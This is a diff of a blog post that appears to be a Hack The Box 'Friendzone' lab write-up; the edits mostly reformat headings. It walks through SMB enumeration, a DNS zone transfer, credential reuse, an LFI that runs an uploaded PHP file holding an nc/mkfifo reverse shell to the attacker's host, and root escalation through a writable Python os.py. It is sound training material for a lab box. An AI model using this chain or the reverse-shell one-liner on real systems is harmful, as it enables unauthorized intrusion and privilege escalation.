@@ -2,21 +2,22 @@
 layout: post
 title: Hack The Box - Friendzone
 categories: hack-the-box
-tags: [Linux, smb, Web, LFI, php, ssh, Python]
+tags: [linux, smb, web, lfi, php, ssh, python]
+description: My write-up for FriendZone from Hack The Box.
 image: /hackthebox/friendzone/0.png
 ---
 
 <hr>
-### Quick Summary 
-#### Hey guys today Friendzone retired and here's my write-up about it. Friendzone was a very nice and easy box. I enjoyed solving it and I really liked it, it had a lot of funny parts as well. It's a Linux box and its ip is `10.10.10.123`, I added it to `/etc/hosts` as `friendzone.htb`. Let's jump right in !
+## Quick Summary 
+<br> Hey guys today Friendzone retired and here's my write-up about it. Friendzone was a very nice and easy box. I enjoyed solving it and I really liked it, it had a lot of funny parts as well. It's a Linux box and its ip is `10.10.10.123`, I added it to `/etc/hosts` as `friendzone.htb`. Let's jump right in !
 ![](/images/hackthebox/friendzone/0.png)
 <hr>
-### Nmap
-#### As always we will start with `nmap` to scan for open ports and services :
+## Nmap
+<br> As always we will start with `nmap` to scan for open ports and services :
 `nmap -sV -sT friendzone.htb`
 ![](/images/hackthebox/friendzone/1.png)
-#### Note : I didn't do a script scan (`-sC`) because for some reason it took a lot of time and didn't finish.
-#### We got `ftp` on port 21, `ssh` on port 22, `dns` on port 53, `http` on port 80, `https` on port 443 and `smb`. Unfortunately anonymous login wasn't allowed on `ftp` :
+<br> Note : I didn't do a script scan (`-sC`) because for some reason it took a lot of time and didn't finish.
+<br> We got `ftp` on port 21, `ssh` on port 22, `dns` on port 53, `http` on port 80, `https` on port 443 and `smb`. Unfortunately anonymous login wasn't allowed on `ftp` :
 ```
 root@kali:~/Desktop/HTB/boxes/friendzone# ftp friendzone.htb 
 Connected to friendzone.htb.
@@ -28,11 +29,11 @@ Password:
 Login failed.
 ftp> 
 ```
-#### Let's check `smb`.
+<br> Let's check `smb`.
 <br>
 <hr>
-### SMB
-#### I used `smbclient` to list the shares :
+## SMB
+<br> I used `smbclient` to list the shares :
 ```
 root@kali:~/Desktop/HTB/boxes/friendzone# smbclient --list friendzone.htb -U ""
 Enter WORKGROUP\'s password:
@@ -53,8 +54,8 @@ Reconnecting with SMB1 for workgroup listing.
         ---------            -------
         WORKGROUP            FRIENDZONE
 ```
-#### I also used `smbmap` to know what permissions do I have : `smbmap -H friendzone.htb`.  I found that I had read access to `general` and read/write access to `Development`. I also noticed that the comment of the share `Files` discloses the path of that share : `/etc/Files`, so we can assume that all shares are in `/etc`.
-#### In `general` I found a file called `creds.txt` :
+<br> I also used `smbmap` to know what permissions do I have : `smbmap -H friendzone.htb`.  I found that I had read access to `general` and read/write access to `Development`. I also noticed that the comment of the share `Files` discloses the path of that share : `/etc/Files`, so we can assume that all shares are in `/etc`.
+<br> In `general` I found a file called `creds.txt` :
 ```
 root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/general -U ""
 Enter WORKGROUP\'s password: 
@@ -75,8 +76,8 @@ creds for the admin THING:
 
 admin:WORKWORKHhallelujah@#
 ```
-#### So we have credentials but we don't know where to use them, it says `creds for the admin THING`, so let's keep enumerating until we find that admin thing.
-#### `Development` was just empty :
+<br> So we have credentials but we don't know where to use them, it says `creds for the admin THING`, so let's keep enumerating until we find that admin thing.
+<br> `Development` was just empty :
 ```
 root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/development -U ""
 Enter WORKGROUP\'s password: 
@@ -85,19 +86,19 @@ smb: \> ls
   .                                   D        0  Fri Jul 12 13:17:50 2019
   ..                                  D        0  Wed Jan 23 23:51:02 2019
 ```
-#### But since we have write access to that share and we know its path : `/etc/Development` then that share can help us later if we have a an `LFI` or a similar vulnerability.
+<br> But since we have write access to that share and we know its path : `/etc/Development` then that share can help us later if we have a an `LFI` or a similar vulnerability.
 <br>
 <hr>
-### HTTP and DNS
-#### `http://friendzone.htb` :
+## HTTP and DNS
+<br> `http://friendzone.htb` :
 ![](/images/hackthebox/friendzone/2.png)
-#### A static page, not really interesting, I noticed that email at the bottom : `info@friendzoneportal.red` so I added `friendzoneportal.red` to `/etc/hosts` :
+<br> A static page, not really interesting, I noticed that email at the bottom : `info@friendzoneportal.red` so I added `friendzoneportal.red` to `/etc/hosts` :
 ![](/images/hackthebox/friendzone/3.png)
-#### But `http://friendzoneportal.red` was just the same thing :
+<br> But `http://friendzoneportal.red` was just the same thing :
 ![](/images/hackthebox/friendzone/4.png)
-#### I went back and added `friendzone.red` to the hosts file :
+<br> I went back and added `friendzone.red` to the hosts file :
 ![](/images/hackthebox/friendzone/5.png)
-#### But it was also the same thing. Then I remembered that there's a `dns` server so I used dig :
+<br> But it was also the same thing. Then I remembered that there's a `dns` server so I used dig :
 ```
 root@kali:~/Desktop/HTB/boxes/friendzone# dig axfr friendzone.red @10.10.10.123
 
@@ -116,33 +117,33 @@ friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604
 ;; WHEN: Fri Jul 12 13:22:51 EET 2019
 ;; XFR size: 8 records (messages 1, bytes 289)
 ```
-#### now we have : `administrator1.friendzone.red`, `hr.friendzone.red` and `uploads.friendzone.red`. I edited the hosts file again :
+<br> now we have : `administrator1.friendzone.red`, `hr.friendzone.red` and `uploads.friendzone.red`. I edited the hosts file again :
 ![](/images/hackthebox/friendzone/6.png)
-#### But I still got the same thing, I ran `gobuster` and got `/wordpress` which was empty :
+<br> But I still got the same thing, I ran `gobuster` and got `/wordpress` which was empty :
 ![](/images/hackthebox/friendzone/7.png)
-#### And `robots.txt` which wasn't a real `robots.txt` file :D
+<br> And `robots.txt` which wasn't a real `robots.txt` file :D
 ![](/images/hackthebox/friendzone/8.png)
-#### There was another `https` port so I tried that.
-#### `https://friendzone.red` :
+<br> There was another `https` port so I tried that.
+<br> `https://friendzone.red` :
 ![](/images/hackthebox/friendzone/9.png)
-#### `https://administrator1.friendzone.red` :
+<br> `https://administrator1.friendzone.red` :
 ![](/images/hackthebox/friendzone/10.png)
-#### So this is the "administrator thing" let's try the credentials we have :
+<br> So this is the "administrator thing" let's try the credentials we have :
 ![](/images/hackthebox/friendzone/11.png)
 <br>
 <br>
 ![](/images/hackthebox/friendzone/12.png)
-#### Great. `/dashboard.php` :
+<br> Great. `/dashboard.php` :
 ![](/images/hackthebox/friendzone/13.png)
 <hr>
-### LFI in dashboard.php, User Flag
-#### As you can see it's complaining about missing parameters, by looking at the example : `image_id=a.jpg&pagename=timestamp` my first guess was that `dashboard.php` includes the `php` file provided in the `pagename` parameter. So if we give it `test` it will append `.php` to `test` then include that file. We can upload files to the `smb` share `Development` and we also know the full path : `/etc/Development`, so if it's really vulnerable to `LFI` we can get a reverse shell easily. I wrote a small `php` script to get a reverse shell :
+## LFI in dashboard.php, User Flag
+<br> As you can see it's complaining about missing parameters, by looking at the example : `image_id=a.jpg&pagename=timestamp` my first guess was that `dashboard.php` includes the `php` file provided in the `pagename` parameter. So if we give it `test` it will append `.php` to `test` then include that file. We can upload files to the `smb` share `Development` and we also know the full path : `/etc/Development`, so if it's really vulnerable to `LFI` we can get a reverse shell easily. I wrote a small `php` script to get a reverse shell :
 ```
 <?php
 system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f');
 ?>
 ```
-#### Then I uploaded it to `Development` :
+<br> Then I uploaded it to `Development` :
 ```
 root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/development -U ""
 Enter WORKGROUP\'s password: 
@@ -151,16 +152,16 @@ smb: \> put rev.php
 putting file rev.php as \rev.php (0.3 kb/s) (average 0.3 kb/s)
 smb: \> 
 ```
-#### And finally I tested my idea :
+<br> And finally I tested my idea :
 `https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&pagename=/etc/Development/rev`
 ![](/images/hackthebox/friendzone/14.png)
-#### It worked and now we have a reverse shell as `www-data` :
+<br> It worked and now we have a reverse shell as `www-data` :
 ![](/images/hackthebox/friendzone/15.png)
-#### We owned user.
+<br> We owned user.
 <br>
 <hr>
-### SSH as friend, Privilege Escalation
-#### I looked into `/var/www` and found a file called `mysql_data.conf` which had some credentials :
+## SSH as friend, Privilege Escalation
+<br> I looked into `/var/www` and found a file called `mysql_data.conf` which had some credentials :
 ```
 $ ls -la
 total 36
@@ -183,7 +184,7 @@ db_pass=Agpyu12!0.213$
 db_name=FZ
 $
 ```
-#### I could get `ssh` access as friend with them :
+<br> I could get `ssh` access as friend with them :
 ```
 root@kali:~/Desktop/HTB/boxes/friendzone# ssh friend@friendzone.htb
 The authenticity of host 'friendzone.htb (10.10.10.123)' can't be established.
@@ -203,11 +204,11 @@ You have mail.
 Last login: Fri Jul 12 14:26:57 2019 from 10.10.13.142
 friend@FriendZone:~$ 
 ```
-#### I did the regular enumeration and I ran [`pspy`](https://github.com/DominicBreuker/pspy) to monitor the processes to see if there's something that can be exploited :
+<br> I did the regular enumeration and I ran [`pspy`](https://github.com/DominicBreuker/pspy) to monitor the processes to see if there's something that can be exploited :
 ![](/images/hackthebox/friendzone/16.png)
-#### After some time I saw this :
+<br> After some time I saw this :
 ![](/images/hackthebox/friendzone/17.png)
-#### Root runs `/opt/server_admin/reporter.py`  from time to time.
+<br> Root runs `/opt/server_admin/reporter.py`  from time to time.
 ```
 friend@FriendZone:/opt/server_admin$ cat reporter.py 
 #!/usr/bin/python
@@ -226,9 +227,9 @@ print "[+] Trying to send email to %s"%to_address
 # I need to edit the script later
 # Sam ~ python developer
 ```
-#### So if we can write to that script then we can get a shell as root. Unfortunately we can't :
+<br> So if we can write to that script then we can get a shell as root. Unfortunately we can't :
 ![](/images/hackthebox/friendzone/18.png)
-#### But I noticed that it's importing the `os` library. Usually python libraries are only writable by root, but I checked `os.py` and friend had permissions to write to it :
+<br> But I noticed that it's importing the `os` library. Usually python libraries are only writable by root, but I checked `os.py` and friend had permissions to write to it :
 ```
 friend@FriendZone:/usr/lib/python2.7$ ls -la | grep os
 -rwxr-xr-x  1 root   root     4635 Apr 16  2018 os2emxpath.py
@@ -242,16 +243,16 @@ friend@FriendZone:/usr/lib/python2.7$ ls -la | grep os
 -rwxr-xr-x  1 root   root    13935 Apr 16  2018 posixpath.py
 -rwxr-xr-x  1 root   root    11385 Oct  6  2018 posixpath.pyc
 ```
-#### So I just put those two lines at the bottom of `os.py` :
+<br> So I just put those two lines at the bottom of `os.py` :
 ![](/images/hackthebox/friendzone/19.png)
-#### And after a minute I got a shell :
+<br> And after a minute I got a shell :
 ![](/images/hackthebox/friendzone/20.png)
-#### And we owned root !
-#### That's it , Feedback is appreciated !
-#### Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
-#### Thanks for reading.
+<br> And we owned root !
+<br> That's it , Feedback is appreciated !
+<br> Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
+<br> Thanks for reading.
 <br>
 <br>
-#### Previous Hack The Box write-up : [Hack The Box - Hackback](/hack-the-box/hackback/)
-#### Next Hack The Box write-up : [Hack The Box - CTF](/hack-the-box/ctf/)
+<br> Previous Hack The Box write-up : [Hack The Box - Hackback](/hack-the-box/hackback/)
+<br> Next Hack The Box write-up : [Hack The Box - CTF](/hack-the-box/ctf/)
 <hr>
